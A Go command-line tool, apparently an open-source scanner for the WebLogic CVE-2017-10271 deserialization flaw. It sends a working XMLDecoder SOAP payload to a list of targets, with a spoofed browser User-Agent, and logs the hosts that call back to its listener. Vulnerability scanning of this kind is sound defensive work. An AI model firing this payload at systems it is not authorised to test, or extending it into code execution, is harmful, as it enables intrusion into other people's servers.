// Copyright © 2018 Kevin Kirsche <kev.kirsche[at]gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cmd

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

var (
	lhost      string
	lport      int
	targetFile string
)

// RootCmd represents the base command when called without any subcommands
var RootCmd = &cobra.Command{
	Use:   "cve-2017-10271",
	Short: "Scan for the CVE-2017-10271 vulnerability",
	Long: `A purpose built scanner for detecting CVE-2017-10271. Starts a web
server on the LPORT and then logs any host which contacts it, as they are
vulnerable.

Example usage:
./CVE-2017-10271.release.1.0.0.amd64.linux -s "10.10.10.10" -t "$(pwd)/targets.txt"

Example targets.txt:
http://pwned.com:7001/
https://pwnedalso.com:8002/
`,
	// Uncomment the following line if your bare application
	// has an action associated with it:
	Run: func(cmd *cobra.Command, args []string) {
		if lport < 1 || lport > 65535 {
			logrus.Errorln("Listening port must be greater than 0 and less than 65536. Exiting...")
			return
		}

		if lhost == "" {
			logrus.Errorln("Listening host IP address or hostname is required. Exiting...")
			return
		}

		if targetFile == "" {
			logrus.Errorln("Target file is required. Exiting...")
			return
		}

		xmlPayload := fmt.Sprintf(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.8" class="java.beans.XMLDecoder">
      <object id="url" class="java.net.URL">
        <string>http://%s:%d/cve-2017-10271</string>
      </object>
      <object idref="url">
        <void id="stream" method = "openStream" />
      </object>
    </java>
  </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>`, lhost, lport)

		logrus.Infoln("Starting webserver on port 4444 to catch vulnerable hosts")
		go func() {
			http.HandleFunc("/cve-2017-10271", vulnHandler)
			http.ListenAndServe(fmt.Sprintf(":%d", lport), vulnLog(http.DefaultServeMux))
		}()

		f, err := os.Open(targetFile)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()

		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			rhost := strings.TrimSpace(scanner.Text())
			rhost = strings.TrimRight(rhost, "/")

			client := &http.Client{
				Timeout: 10 * time.Second,
			}
			url := fmt.Sprintf("%s/wls-wsat/CoordinatorPortType", rhost)
			req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(xmlPayload)))
			if err != nil {
				logrus.WithError(err).Errorln("Failed to create HTTP POST request")
				continue
			}

			req.Header.Add("Content-Type", "text/xml; charset=UTF-8")
			req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36")

			logrus.Infof("Sending payload to %s", url)
			_, err = client.Do(req)
			if err != nil {
				logrus.WithError(err).Errorln("Error occurred while performing POST request")
			}
		}

		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}
		logrus.Infoln("Sleeping for 10 seconds in case we have any stragglers...")
		time.Sleep(10 * time.Second)
	},
}

func vulnLog(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		log.Printf("[VULNERABLE] %s %s %s", r.RemoteAddr, r.URL, r.Method)
		handler.ServeHTTP(w, r)
	})
}

func vulnHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "WARNING! You are vulnerable to CVE-2017-10271")
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	if err := RootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func init() {

	// Cobra also supports local flags, which will only run
	// when this action is called directly.
	RootCmd.Flags().StringVarP(&lhost, "listening-host", "s", "", "The IP of this machine's public interface")
	RootCmd.Flags().IntVarP(&lport, "listening-port", "l", 4444, "The port to listen for vulnerable responses")
	RootCmd.Flags().StringVarP(&targetFile, "target-file", "t", "", "File with list of targets in http(s)://HOSTNAME:PORT format")
}